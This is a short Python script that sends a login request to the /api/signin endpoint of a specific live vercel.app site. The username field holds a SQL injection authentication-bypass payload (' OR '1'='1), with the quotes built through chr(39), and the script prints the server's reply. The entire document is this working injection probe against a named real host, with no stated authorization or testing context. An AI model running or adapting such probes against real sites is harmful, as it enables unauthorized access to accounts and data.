import urllib.request, json, urllib.error
quote = chr(39)
username = f"testuser{quote} OR {quote}1{quote}={quote}1"
data = json.dumps({"username": username, "password": "anything"}).encode()
req = urllib.request.Request("https://euphonium-fgte.vercel.app/api/signin", data=data, method="POST", headers={"Content-Type":"application/json"})
try:
    with urllib.request.urlopen(req, timeout=5) as resp:
        print(resp.status)
        print(resp.read().decode())
except urllib.error.HTTPError as e:
    print(e.code)
    print(e.read().decode())
